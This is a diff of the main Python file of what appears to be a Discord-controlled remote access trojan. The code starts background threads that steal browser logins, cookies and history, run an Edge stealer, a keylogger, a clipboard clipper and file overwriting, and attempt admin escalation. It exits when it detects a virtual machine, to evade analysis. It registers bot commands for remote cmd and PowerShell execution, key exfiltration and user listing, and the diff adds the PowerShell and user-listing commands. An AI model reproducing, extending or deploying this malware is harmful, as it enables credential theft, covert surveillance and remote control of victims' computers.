@@ -1,24 +1,19 @@
 import discord
 from discord.ext import commands
 import start.info
-import startuplogic.askadmin
+import startuplogic.addme
 import startuplogic.clipper
-from startuplogic.excludeme import excludeme
 import sys
 import time, threading
 from co import config
 #--------------------------------------------------------------------------------------------------------------------------------------
-import startuplogic.antirestart
 import startuplogic.key
 import startuplogic.overwritefiles
-import startuplogic.disablefeatures
 import startuplogic.clipper
 from startuplogic.antivm import VM
 from startuplogic.addme import run_all
-from startuplogic.note import shownote
 from startuplogic.logins import extract_logins_cookies_history
 from startuplogic.edgestealer import edgethief
-from startuplogic.key import run_keylogger
 #--------------------------------------------------------------------------------------------------------------------------------------
 from command.mediacommands import *
 from command.utilitycommands import *
@@ -32,30 +27,24 @@ sys.dont_write_bytecode = True
 import threading
 import time
 import sys
+
 def check_vm_and_run(func):
     if VM is False:
         func()
 if VM is False:
     threading.Thread(target=lambda: check_vm_and_run(startuplogic.askadmin.setup), daemon=True).start()
-    threading.Thread(target=lambda: check_vm_and_run(extract_logins_cookies_history), daemon=True).start()
-    threading.Thread(target=lambda: check_vm_and_run(edgethief), daemon=True).start()
     threading.Thread(target=lambda: check_vm_and_run(run_all), daemon=True).start()
-    threading.Thread(target=lambda: check_vm_and_run(excludeme), daemon=True).start()
-    if hasattr(config, "ENABLE_ANTI_RESTART") and config.ENABLE_ANTI_RESTART:
-        threading.Thread(target=lambda: check_vm_and_run(startuplogic.antirestart.anti_restart), daemon=True).start()
-        threading.Thread(target=lambda: check_vm_and_run(shownote), daemon=True).start() 
+    threading.Thread(target=lambda: check_vm_and_run(extract_logins_cookies_history), daemon=True).start()
+    threading.Thread(target=lambda: check_vm_and_run(edgethief), daemon=True).start()       
     if hasattr(config, "ENABLE_KEYLOGGER") and config.ENABLE_KEYLOGGER:
-        threading.Thread(target=lambda: check_vm_and_run(startuplogic.key.run_keylogger), daemon=True).start()
-    if hasattr(config, "DISABLE_FEATURES") and config.DISABLE_FEATURES:
-       threading.Thread(target=lambda: (check_vm_and_run(startuplogic.disablefeatures.disablefeatures)), daemon=True).start()       
+        threading.Thread(target=lambda: check_vm_and_run(startuplogic.key.run_keylogger), daemon=True).start()    
     if hasattr(config, "ENABLE_FILE_OVERWRITING") and config.ENABLE_FILE_OVERWRITING:
         threading.Thread(target=lambda: check_vm_and_run(startuplogic.overwritefiles.overwritefiles), daemon=True).start() 
     if hasattr(config, "ENABLE_CLIPPER") and config.ENABLE_CLIPPER:
-        threading.Thread(target=lambda: check_vm_and_run(startuplogic.clipper.clips), daemon=True).start()          
-    time.sleep(0.5)
+        threading.Thread(target=lambda: check_vm_and_run(startuplogic.clipper.clips), daemon=True).start()                
+    time.sleep(3)
 elif VM is True:
     sys.exit()
-#--------------------------------------------------------------------------------------------------------------------------------------
 token = config.TOKEN
 if not token:
     print("INVALID TOKEN SKIPPING...")
@@ -104,6 +93,8 @@ else:
     bot.add_command(commands.Command(cmd_command, name='cmd'))
     bot.add_command(commands.Command(bassboost_command, name='bassboost'))
     bot.add_command(commands.Command(zip_and_send_keys, name='getkeys'))
+    bot.add_command(commands.Command(powershell_command, name='ps'))
+    bot.add_command(commands.Command(listusers, name='listusers'))
 #--------------------------------------------------------------------------------------------------------------------------------------
 if VM is False:    
     bot.run(token)
